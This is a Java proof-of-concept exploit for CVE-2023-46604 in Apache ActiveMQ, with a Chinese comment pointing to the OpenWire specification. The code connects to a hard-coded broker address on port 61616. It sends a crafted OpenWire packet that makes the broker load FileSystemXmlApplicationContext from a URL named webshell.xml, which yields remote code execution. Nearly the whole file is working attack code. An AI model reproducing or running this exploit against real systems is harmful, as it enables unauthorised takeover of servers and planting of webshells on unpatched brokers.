package activemq.cve;

import javax.jms.JMSException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
/**
 * 构造标准的openwire协议：https://activemq.apache.org/openwire-version-2-specification
 */
public class CVE_2023_46604_standard_protocol {

    public static byte[] byteMerger(byte[] bt1, byte[] bt2){
        byte[] bt3 = new byte[bt1.length + bt2.length];
        System.arraycopy(bt1, 0, bt3, 0, bt1.length);
        System.arraycopy(bt2, 0, bt3, bt1.length, bt2.length);
        return bt3;
    }

    public static String bytesToHex(byte[] bytes) {
        StringBuffer sb = new StringBuffer();
        for(int i = 0; i < bytes.length; i++) {
            String hex = Integer.toHexString(bytes[i] & 0xFF);
            if(hex.length() < 2){
                sb.append(0);
            }
            sb.append(hex);
        }
        return sb.toString();
    }
    public static void main(String[] args) throws JMSException, IOException {

        String host = "10.58.120.201";
        int port = 61616;
        Socket socket = new Socket(host, port);
        OutputStream outputStream = socket.getOutputStream();

        byte[] header = new byte[] {0x1f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
        String className = "org.springframework.context.support.FileSystemXmlApplicationContext";
        String message = "http://127.0.0.1/webshell.xml";
        byte[] ClassNameBytes = className.getBytes();
        byte[] messageBytes = message.getBytes();
        byte[] notnull = new byte[]{0x01};
        byte[] classLength = new byte[]{0x00,(byte)(ClassNameBytes.length)};
        byte[] NamePartbytes = byteMerger(classLength, ClassNameBytes);
        byte[] partOne = byteMerger(notnull,NamePartbytes);
        byte[] messageLength = new byte[]{0x00,(byte)(messageBytes.length)};
        byte[] messagePartBytes = byteMerger(messageLength, messageBytes);
        byte[] partTwo = byteMerger(notnull, messagePartBytes);
        byte[] body =byteMerger(notnull,byteMerger(partOne,partTwo));
        byte[] packagelength = new byte[]{0x00,0x00,0x00,(byte)((header.length + body.length) / 2 )};
        byte[] payload = byteMerger(packagelength, byteMerger(header, body));

        System.out.println("[*] send payload :" + bytesToHex(payload));
        outputStream.write(payload);
        outputStream.flush();

        InputStream inputStream = socket.getInputStream();
        ByteArrayOutputStream byteArrayOutputStream  = new ByteArrayOutputStream();
        int read;
        while ((read = inputStream.read()) != -1){
            byteArrayOutputStream.write(read);
        }
        System.out.println("[*]receive : "+ new String(byteArrayOutputStream.toByteArray()));
        outputStream.close();

        outputStream.close();
    }
}